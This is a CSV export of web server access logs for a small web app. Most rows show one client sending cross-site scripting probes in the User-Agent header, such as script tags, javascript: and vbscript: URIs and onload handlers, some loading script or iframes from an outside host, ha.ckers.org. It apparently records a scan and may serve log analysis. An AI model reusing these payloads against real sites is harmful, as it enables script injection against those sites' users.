"","X1","X2","X3","X4","X5","X6","X7","X8","X9","X10"
"219","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:55 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=//ha.ckers.org/.j> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"220","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:25:55 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <SCRIPT SRC=//ha.ckers.org/.j> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"221","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:26:15 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=""javascript:alert('XSS')","Mozilla/5.0"
"222","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:26:15 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=""javascript:alert('XSS')","Mozilla/5.0"
"223","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:26:15 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=""javascript:alert('XSS')","Mozilla/5.0"
"224","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:28:15 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""javascript:alert('XSS')","Mozilla/5.0"
"225","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:15 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""javascript:alert('XSS')","Mozilla/5.0"
"226","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:34 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <iframe src=http://ha.ckers.org/scriptlet.html < Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","37"
"227","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:34 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <iframe src=http://ha.ckers.org/scriptlet.html < Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","35"
"228","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:34 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <iframe src=http://ha.ckers.org/scriptlet.html < Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","61"
"229","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:35 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <iframe src=http://ha.ckers.org/scriptlet.html < Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","214"
"230","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:35 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <iframe src=http://ha.ckers.org/scriptlet.html < Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"231","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:35 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <iframe src=http://ha.ckers.org/scriptlet.html < Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"232","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:52 +0000","GET / HTTP/1.1",200,1040,NA,"datalab \"";alert('XSS');// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"233","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:53 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab \"";alert('XSS');// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"234","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:30:53 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab \"";alert('XSS');// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"235","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:32:53 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab \"";alert('XSS');// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"236","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:34:53 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab \"";alert('XSS');// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"237","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:35:14 +0000","GET / HTTP/1.1",200,1040,NA,"datalab </script><script>alert('XSS');</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","45"
"238","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:35:15 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab </script><script>alert('XSS');</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","52"
"239","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:35:15 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab </script><script>alert('XSS');</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"240","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:37:15 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab </script><script>alert('XSS');</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"241","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:15 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab </script><script>alert('XSS');</script> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"242","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:35 +0000","GET / HTTP/1.1",200,1040,NA,"datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","30"
"243","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:35 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","12"
"244","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:36 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"245","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:36 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","201"
"246","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:37 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"247","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:37 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"248","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:58 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <INPUT TYPE=""IMAGE","SRC=""javascript:alert('XSS');"">"
"249","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:58 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <INPUT TYPE=""IMAGE","SRC=""javascript:alert('XSS');"">"
"250","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:39:58 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <INPUT TYPE=""IMAGE","SRC=""javascript:alert('XSS');"">"
"251","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:41:58 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <INPUT TYPE=""IMAGE","SRC=""javascript:alert('XSS');"">"
"252","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:43:58 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <INPUT TYPE=""IMAGE","SRC=""javascript:alert('XSS');"">"
"253","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:44:57 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <BODY BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","39"
"254","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:46:08 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <BODY BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","33"
"255","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:46:09 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <BODY BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","18"
"256","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:48:08 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <BODY BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"257","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:50:09 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <BODY BACKGROUND=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"258","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:50:28 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG DYNSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","33"
"259","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:50:28 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG DYNSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","60"
"260","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:50:28 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG DYNSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"261","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:52:28 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG DYNSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"262","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:54:29 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG DYNSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"263","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:54:49 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG LOWSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","79"
"264","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:54:49 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG LOWSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","63"
"265","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:54:50 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG LOWSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","17"
"266","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:56:49 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG LOWSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"267","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:58:50 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG LOWSRC=""javascript:alert('XSS')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"268","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:59:12 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","132"
"269","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:59:12 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","64"
"270","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:59:12 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"271","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:01:12 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"272","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:03:13 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"273","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:03:31 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC='vbscript:msgbox(""XSS"")'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","33"
"274","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:03:31 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC='vbscript:msgbox(""XSS"")'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","51"
"275","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:03:32 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC='vbscript:msgbox(""XSS"")'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"276","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:05:31 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC='vbscript:msgbox(""XSS"")'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"277","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:07:32 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC='vbscript:msgbox(""XSS"")'> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"278","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:07:53 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=""livescript:[code]""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","43"
"279","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:07:54 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=""livescript:[code]""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","12"
"280","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:07:54 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=""livescript:[code]""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"281","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:07:55 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=""livescript:[code]""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","225"
"282","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:07:55 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""livescript:[code]""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"283","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:07:55 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=""livescript:[code]""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"284","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:08:18 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <BODY ONLOAD=alert('XSS')> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","30"
"285","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:08:18 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <BODY ONLOAD=alert('XSS')> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"286","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:08:18 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <BODY ONLOAD=alert('XSS')> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"287","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:10:18 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <BODY ONLOAD=alert('XSS')> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"288","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:12:19 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <BODY ONLOAD=alert('XSS')> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"289","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:12:39 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <BGSOUND SRC=""javascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","40"
"290","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:12:39 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <BGSOUND SRC=""javascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","60"
"291","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:12:39 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <BGSOUND SRC=""javascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"292","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:14:39 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <BGSOUND SRC=""javascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"293","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:16:40 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <BGSOUND SRC=""javascript:alert('XSS');""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"294","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:16:54 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <BR SIZE=""&{alert('XSS')}""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","34"
"295","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:16:54 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <BR SIZE=""&{alert('XSS')}""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","52"
"296","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:16:54 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <BR SIZE=""&{alert('XSS')}""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"297","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:15:18:54 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <BR SIZE=""&{alert('XSS')}""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
